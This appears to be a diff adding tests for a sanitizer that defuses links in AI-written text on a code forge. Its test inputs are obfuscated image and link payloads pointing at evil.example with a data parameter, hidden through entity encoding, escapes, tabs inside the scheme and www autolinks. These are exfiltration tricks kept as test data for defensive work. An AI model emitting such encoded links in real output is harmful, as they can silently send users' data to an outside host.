@@ -237,6 +237,30 @@ test("a backtick the model writes around a link does not give it back its effect
   }
 });
 
+test("a URL the reader's parser decodes is read the way the parser reads it: entities, backslash escapes, tabs and line breaks inside the scheme, and www autolinks", () => {
+  for (const text of [
+    '<img src="https&#58;//evil.example/?d=1">', // an HTML parser decodes the entity: the image is fetched
+    '<img src="https&#x3a;&#x2f;&#x2f;evil.example/?d=1">',
+    '<img src="https&colon;&sol;&sol;evil.example/?d=1">',
+    '<img src="ht\ttps://evil.example/?d=1">', // a URL parser drops a tab or a line break anywhere in the URL
+    '<img src="ht\ntps://evil.example/?d=1">',
+    "![x](https&#58;//evil.example/?d=1)", // CommonMark decodes entities and backslash escapes in a link destination
+    "![x](https\\://evil.example/?d=1)",
+    "[x](https&#58;//evil.example/?d=1)",
+    "see www.evil.example/?d=1 now", // GFM autolinks www.
+  ]) {
+    const out = sanitizeModelText(text, "github");
+    assert.ok(!hasLiveUrl(out) && !/www\.evil/.test(out) && !/&#|&colon|&sol/.test(out), `${text} -> ${out}`);
+    assert.ok(out.includes("`"), `${text} was left as it was: ${out}`);
+  }
+  assert.equal(sanitizeModelText("[ok](https&#58;//github.com/o/r/pull/1) and <a href=\"https&#58;//github.com/o/r\">r</a>", "github").includes("`"), false, "a decoded link to the forge's own host stays as written");
+});
+
+test("a link destination with balanced parentheses is wrapped whole", () => {
+  const out = sanitizeModelText("![x](https://evil.example/?k=(1)) after", "github");
+  assert.match(out, /^`!\[x\]\(https.:\/\/evil\.example\/\?k=\(1\)\)` after$/u);
+});
+
 test("text without a link to follow is left alone", () => {
   for (const text of ["the `https` module and a//b paths, ![not an image", "write [x](not a link) or a <b>bold</b> word", "1 < 2 > 0, a<b and c>d", "no scheme: example.com/x?d=1"]) {
     assert.equal(sanitizeModelText(text, "github"), text, text);
